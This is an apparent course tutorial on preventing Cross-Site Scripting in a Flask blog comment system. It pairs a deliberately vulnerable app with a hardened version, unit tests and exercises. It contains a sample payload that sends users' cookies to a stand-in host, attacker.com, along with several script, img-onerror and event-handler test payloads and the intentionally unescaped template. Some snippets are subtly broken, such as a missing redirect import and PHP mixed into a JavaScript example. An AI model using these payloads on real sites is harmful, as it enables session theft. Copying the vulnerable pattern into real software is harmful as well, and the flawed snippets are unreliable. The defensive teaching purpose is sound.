# Example 2: Cross-Site Scripting (XSS) Prevention

## 🎯 Learning Objectives

By completing this example, you will:

1. **Understand** what Cross-Site Scripting (XSS) is and its variants
2. **Identify** XSS vulnerabilities in web applications
3. **Implement** proper output encoding/escaping
4. **Apply** Content Security Policy (CSP) headers
5. **Use** modern frameworks' built-in protections

## 📋 Prerequisites

- Basic HTML, CSS, JavaScript knowledge
- Understanding of HTTP requests/responses
- Python 3.8+ with Flask

**Required Tools**:
```bash
pip install flask
```

**Estimated Time**: 45-60 minutes

---

## 🔍 Problem Description

### The Scenario

You're building a comment section for a blog where users can post comments that include their name. The application displays these comments to other users.

### The Vulnerability

If user input is displayed without proper encoding, attackers can inject malicious JavaScript that executes in other users' browsers. This is called **Cross-Site Scripting (XSS)**.

### XSS Attack Types

1. **Reflected XSS**: Malicious script comes from the current HTTP request
2. **Stored XSS**: Malicious script is stored in the database
3. **DOM-based XSS**: Vulnerability exists in client-side JavaScript

### Example Attack

Attacker submits comment:
```html
<script>
document.location='http://attacker.com/steal?cookie='+document.cookie
</script>
```

When other users view the page, their cookies (including session tokens) are sent to the attacker!

---

## ⚠️ Vulnerable Implementation

```python
"""
vulnerable_blog.py

⚠️ VULNERABLE CODE - FOR EDUCATIONAL PURPOSES ONLY
DO NOT USE IN PRODUCTION

Demonstrates XSS vulnerabilities in a simple blog comment system.
"""

from flask import Flask, request, render_template_string
import sqlite3
from datetime import datetime

app = Flask(__name__)

# Initialize database
def init_db():
    conn = sqlite3.connect('comments.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS comments (
            id INTEGER PRIMARY KEY,
            username TEXT NOT NULL,
            comment TEXT NOT NULL,
            timestamp TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# ⚠️ VULNERABLE: No escaping of user input
VULNERABLE_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Vulnerable Blog</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; }
        .comment { border: 1px solid #ddd; padding: 10px; margin: 10px 0; }
        .username { font-weight: bold; color: #333; }
        .timestamp { color: #666; font-size: 0.9em; }
        form { margin: 20px 0; padding: 20px; background: #f5f5f5; }
        input, textarea { width: 100%; padding: 8px; margin: 5px 0; }
        button { padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h1>⚠️  Vulnerable Blog Comments</h1>
    <p style="color: red;">WARNING: This page is vulnerable to XSS attacks!</p>
    
    <h2>Post a Comment</h2>
    <form method="POST" action="/post_vulnerable">
        <input type="text" name="username" placeholder="Your name" required>
        <textarea name="comment" placeholder="Your comment" rows="4" required></textarea>
        <button type="submit">Submit Comment</button>
    </form>
    
    <h2>Comments</h2>
    {% for comment in comments %}
    <div class="comment">
        <div class="username">{{ comment[1] }}</div>
        <div class="timestamp">{{ comment[3] }}</div>
        <!-- ⚠️ VULNERABILITY: Direct rendering without escaping -->
        <p>{{ comment[2] | safe }}</p>
    </div>
    {% endfor %}
    
    <hr>
    <h3>Test XSS Attacks (Educational Only)</h3>
    <ul>
        <li>Basic alert: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
        <li>Cookie stealing: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
        <li>Image tag: <code>&lt;img src=x onerror="alert('XSS')"&gt;</code></li>
        <li>Event handler: <code>&lt;div onmouseover="alert('XSS')"&gt;Hover me&lt;/div&gt;</code></li>
    </ul>
</body>
</html>
'''

@app.route('/')
def index_vulnerable():
    conn = sqlite3.connect('comments.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM comments ORDER BY id DESC')
    comments = cursor.fetchall()
    conn.close()
    
    return render_template_string(VULNERABLE_TEMPLATE, comments=comments)

@app.route('/post_vulnerable', methods=['POST'])
def post_vulnerable():
    username = request.form.get('username', '')
    comment = request.form.get('comment', '')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # ⚠️ NO INPUT VALIDATION OR SANITIZATION
    conn = sqlite3.connect('comments.db')
    cursor = conn.cursor()
    cursor.execute(
        'INSERT INTO comments (username, comment, timestamp) VALUES (?, ?, ?)',
        (username, comment, timestamp)
    )
    conn.commit()
    conn.close()
    
    return redirect('/')

if __name__ == '__main__':
    app.run(debug=True, port=5000)
```

---

## ✅ Secure Implementation

```python
"""
secure_blog.py

✅ SECURE CODE - PRODUCTION-READY

Demonstrates proper XSS prevention techniques.
"""

from flask import Flask, request, render_template_string, make_response, redirect, url_for
import sqlite3
from datetime import datetime
import html
import re
import bleach

app = Flask(__name__)

# Configure allowed HTML tags (for rich text comments)
ALLOWED_TAGS = ['b', 'i', 'u', 'em', 'strong', 'a', 'p', 'br']
ALLOWED_ATTRIBUTES = {'a': ['href', 'title']}
ALLOWED_PROTOCOLS = ['http', 'https', 'mailto']

def init_db():
    conn = sqlite3.connect('comments_secure.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS comments (
            id INTEGER PRIMARY KEY,
            username TEXT NOT NULL,
            comment TEXT NOT NULL,
            comment_html TEXT NOT NULL,
            timestamp TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def sanitize_input(text, allow_html=False):
    """
    Sanitize user input to prevent XSS.
    
    Args:
        text: User input string
        allow_html: If True, allow safe HTML tags
        
    Returns:
        Sanitized string safe for display
    """
    if not text:
        return ''
    
    # Trim whitespace
    text = text.strip()
    
    # Limit length (prevent DoS)
    if len(text) > 1000:
        text = text[:1000]
    
    if allow_html:
        # Use bleach to allow only safe HTML
        return bleach.clean(
            text,
            tags=ALLOWED_TAGS,
            attributes=ALLOWED_ATTRIBUTES,
            protocols=ALLOWED_PROTOCOLS,
            strip=True
        )
    else:
        # Escape all HTML entities
        return html.escape(text)

def validate_username(username):
    """
    Validate username format.
    
    Returns:
        (bool, str): (is_valid, error_message)
    """
    if not username:
        return False, "Username is required"
    
    if len(username) < 2 or len(username) > 50:
        return False, "Username must be 2-50 characters"
    
    # Allow letters, numbers, spaces, and basic punctuation
    if not re.match(r'^[a-zA-Z0-9\s\.\-_]+$', username):
        return False, "Username contains invalid characters"
    
    return True, ""

def validate_comment(comment):
    """
    Validate comment content.
    
    Returns:
        (bool, str): (is_valid, error_message)
    """
    if not comment:
        return False, "Comment is required"
    
    if len(comment) < 1 or len(comment) > 1000:
        return False, "Comment must be 1-1000 characters"
    
    return True, ""

# ✅ SECURE TEMPLATE: Uses automatic escaping (default in Flask)
SECURE_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Secure Blog</title>
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';">
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; }
        .comment { border: 1px solid #ddd; padding: 10px; margin: 10px 0; background: #fafafa; }
        .username { font-weight: bold; color: #007bff; }
        .timestamp { color: #666; font-size: 0.9em; }
        form { margin: 20px 0; padding: 20px; background: #e8f4f8; border-radius: 5px; }
        input, textarea { width: 100%; padding: 8px; margin: 5px 0; box-sizing: border-box; }
        button { padding: 10px 20px; background: #28a745; color: white; border: none; cursor: pointer; border-radius: 3px; }
        button:hover { background: #218838; }
        .success { color: green; padding: 10px; background: #d4edda; border: 1px solid #c3e6cb; margin: 10px 0; }
        .error { color: #721c24; padding: 10px; background: #f8d7da; border: 1px solid #f5c6cb; margin: 10px 0; }
        .security-info { background: #d1ecf1; padding: 15px; border-left: 4px solid #0c5460; margin: 20px 0; }
    </style>
</head>
<body>
    <h1>✅ Secure Blog Comments</h1>
    
    <div class="security-info">
        <strong>Security Features:</strong>
        <ul>
            <li>✓ All user input is sanitized and escaped</li>
            <li>✓ Content Security Policy (CSP) headers enabled</li>
            <li>✓ Input validation with length limits</li>
            <li>✓ HTML sanitization for rich text</li>
        </ul>
    </div>
    
    {% if message %}
    <div class="{{ message_type }}">{{ message }}</div>
    {% endif %}
    
    <h2>Post a Comment</h2>
    <form method="POST" action="{{ url_for('post_secure') }}">
        <input type="text" name="username" placeholder="Your name (2-50 chars)" required maxlength="50">
        <textarea name="comment" placeholder="Your comment (max 1000 chars)" rows="4" required maxlength="1000"></textarea>
        <button type="submit">Submit Comment</button>
    </form>
    
    <h2>Comments ({{ comments|length }})</h2>
    {% if comments %}
        {% for comment in comments %}
        <div class="comment">
            <!-- ✅ SECURE: Automatic HTML escaping by Flask -->
            <div class="username">{{ comment[1] }}</div>
            <div class="timestamp">{{ comment[4] }}</div>
            <!-- ✅ SECURE: Pre-sanitized HTML from database -->
            <p>{{ comment[3] | safe }}</p>
        </div>
        {% endfor %}
    {% else %}
        <p>No comments yet. Be the first to comment!</p>
    {% endif %}
    
    <hr>
    <h3>Try These (They Won't Work!):</h3>
    <ul>
        <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> → Escaped as text</li>
        <li><code>&lt;img src=x onerror="alert('XSS')"&gt;</code> → Stripped or escaped</li>
        <li><code>&lt;div onmouseover="alert('XSS')"&gt;</code> → Event handlers removed</li>
    </ul>
    
    <p><em>Safe HTML allowed: &lt;b&gt;bold&lt;/b&gt;, &lt;i&gt;italic&lt;/i&gt;, &lt;a href="..."&gt;links&lt;/a&gt;</em></p>
</body>
</html>
'''

@app.route('/secure')
def index_secure():
    conn = sqlite3.connect('comments_secure.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM comments ORDER BY id DESC LIMIT 50')
    comments = cursor.fetchall()
    conn.close()
    
    # ✅ SECURE: Add CSP header
    response = make_response(render_template_string(
        SECURE_TEMPLATE,
        comments=comments,
        message=request.args.get('message'),
        message_type=request.args.get('message_type', 'success')
    ))
    
    # Content Security Policy
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
        "font-src 'self'; "
        "connect-src 'self';"
    )
    
    # Additional security headers
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    
    return response

@app.route('/post_secure', methods=['POST'])
def post_secure():
    username = request.form.get('username', '')
    comment = request.form.get('comment', '')
    
    # ✅ STEP 1: Validate input
    valid_user, user_error = validate_username(username)
    if not valid_user:
        return redirect(url_for('index_secure', message=user_error, message_type='error'))
    
    valid_comment, comment_error = validate_comment(comment)
    if not valid_comment:
        return redirect(url_for('index_secure', message=comment_error, message_type='error'))
    
    # ✅ STEP 2: Sanitize input
    clean_username = sanitize_input(username, allow_html=False)
    clean_comment = sanitize_input(comment, allow_html=False)
    
    # ✅ STEP 3: Create safe HTML version (for rich text)
    comment_html = sanitize_input(comment, allow_html=True)
    
    # ✅ STEP 4: Store in database
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    try:
        conn = sqlite3.connect('comments_secure.db')
        cursor = conn.cursor()
        cursor.execute(
            'INSERT INTO comments (username, comment, comment_html, timestamp) VALUES (?, ?, ?, ?)',
            (clean_username, clean_comment, comment_html, timestamp)
        )
        conn.commit()
        conn.close()
        
        return redirect(url_for('index_secure', message='Comment posted successfully!', message_type='success'))
    
    except Exception as e:
        return redirect(url_for('index_secure', message='Error posting comment', message_type='error'))

@app.route('/clear_secure')
def clear_secure():
    """Clear all comments (for testing)"""
    conn = sqlite3.connect('comments_secure.db')
    cursor = conn.cursor()
    cursor.execute('DELETE FROM comments')
    conn.commit()
    conn.close()
    return redirect(url_for('index_secure', message='All comments cleared', message_type='success'))

if __name__ == '__main__':
    print("\n" + "="*70)
    print("SECURE BLOG DEMONSTRATION")
    print("="*70)
    print("\nAccess the application at: http://127.0.0.1:5000/secure")
    print("\nSecurity features enabled:")
    print("  ✓ Input validation and sanitization")
    print("  ✓ HTML escaping")
    print("  ✓ Content Security Policy (CSP)")
    print("  ✓ Security headers")
    print("\n" + "="*70 + "\n")
    
    app.run(debug=True, port=5000)
```

---

## 🧪 Testing

### Manual Testing Steps

**Test 1: Basic XSS Attempt**
```
Username: Test User
Comment: <script>alert('XSS')</script>
Expected: Script tags displayed as text, not executed
```

**Test 2: Image Tag XSS**
```
Comment: <img src=x onerror="alert('XSS')">
Expected: Image tag escaped or stripped
```

**Test 3: Event Handler XSS**
```
Comment: <div onmouseover="alert('XSS')">Hover me</div>
Expected: Event handler removed, only text shown
```

**Test 4: Safe HTML**
```
Comment: This is <b>bold</b> and <i>italic</i> text
Expected: Formatting works (if allow_html=True)
```

### Automated Tests

```python
"""
test_xss_prevention.py
"""

import unittest
from secure_blog import sanitize_input, validate_username, validate_comment

class TestXSSPrevention(unittest.TestCase):
    
    def test_script_tag_escaping(self):
        """Test that script tags are escaped"""
        malicious = "<script>alert('XSS')</script>"
        result = sanitize_input(malicious, allow_html=False)
        self.assertNotIn('<script>', result)
        self.assertIn('&lt;script&gt;', result)
    
    def test_image_tag_xss(self):
        """Test that malicious image tags are prevented"""
        malicious = '<img src=x onerror="alert(1)">'
        result = sanitize_input(malicious, allow_html=True)
        # Should not contain onerror attribute
        self.assertNotIn('onerror', result.lower())
    
    def test_event_handler_removal(self):
        """Test that event handlers are removed"""
        malicious = '<div onmouseover="alert(1)">Test</div>'
        result = sanitize_input(malicious, allow_html=True)
        self.assertNotIn('onmouseover', result.lower())
    
    def test_safe_html_allowed(self):
        """Test that safe HTML is preserved"""
        safe_html = 'This is <b>bold</b> and <i>italic</i>'
        result = sanitize_input(safe_html, allow_html=True)
        self.assertIn('<b>bold</b>', result)
        self.assertIn('<i>italic</i>', result)
    
    def test_username_validation(self):
        """Test username validation"""
        self.assertTrue(validate_username('John Doe')[0])
        self.assertFalse(validate_username('x')[0])  # Too short
        self.assertFalse(validate_username('a' * 100)[0])  # Too long
        self.assertFalse(validate_username('<script>')[0])  # Invalid chars
    
    def test_length_limits(self):
        """Test input length limiting"""
        long_input = 'a' * 2000
        result = sanitize_input(long_input, allow_html=False)
        self.assertLessEqual(len(result), 1000)

if __name__ == '__main__':
    unittest.main()
```

---

## 📚 Key Concepts

### XSS Prevention Techniques

**1. Output Encoding/Escaping**
```python
# Convert special HTML characters to entities
html.escape('<script>')  # → '&lt;script&gt;'
```

**2. Input Validation**
```python
# Only allow expected format
if not re.match(r'^[a-zA-Z0-9\s]+$', username):
    return "Invalid input"
```

**3. Content Security Policy (CSP)**
```python
# HTTP header prevents inline scripts
response.headers['Content-Security-Policy'] = "script-src 'self';"
```

**4. HTML Sanitization**
```python
# Allow only safe HTML tags
bleach.clean(text, tags=['b', 'i', 'p'])
```

### Context-Specific Encoding

Different contexts require different encoding:

**HTML Context**:
```python
html.escape(user_input)  # < becomes &lt;
```

**JavaScript Context**:
```javascript
// Use JSON.stringify for data
const data = JSON.stringify(<?php echo json_encode($user_input); ?>);
```

**URL Context**:
```python
from urllib.parse import quote
safe_url = quote(user_input)
```

**CSS Context**:
```python
# Very limited - prefer allowlisting
```

---

## 🎓 Best Practices

### Defense in Depth

✅ **Layer 1: Input Validation**
- Validate format, type, length
- Use allowlists, not denylists

✅ **Layer 2: Output Encoding**
- Always encode user input for display
- Use context-appropriate encoding

✅ **Layer 3: Content Security Policy**
- Disable inline scripts
- Specify trusted sources

✅ **Layer 4: Use Framework Protections**
- React: Automatic escaping in JSX
- Angular: Built-in sanitization
- Flask/Django: Template auto-escaping

### Common Mistakes

❌ Trying to blacklist dangerous strings
❌ Using innerHTML with user data
❌ Disabling framework protections
❌ Only sanitizing on input (must encode on output!)
❌ Trusting client-side validation alone

---

## 📝 Exercises

### Exercise 1: Find the XSS

Identify vulnerabilities in this code:

```javascript
// Display user search query
document.getElementById('result').innerHTML = 
    "You searched for: " + getParameterByName('q');
```

**Vulnerability**: Direct use of innerHTML with URL parameter.  
**Fix**: Use textContent or escape HTML.

### Exercise 2: Implement Safe Search

Create a secure search result display function that:
1. Accepts user query from URL
2. Displays results with highlighting
3. Prevents XSS attacks

### Exercise 3: CSP Configuration

Write a Content Security Policy header for a web application that:
- Allows scripts only from same origin
- Allows styles from same origin and Google Fonts
- Blocks all plugins
- Reports violations to `/csp-report`

---

## 🔗 Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy Guide](https://content-security-policy.com/)
- [Bleach Documentation](https://bleach.readthedocs.io/)
- [Flask Security](https://flask.palletsprojects.com/en/2.3.x/security/)

---

**Last Updated**: October 14, 2025  
**Author**: IDATT2503 Course Team
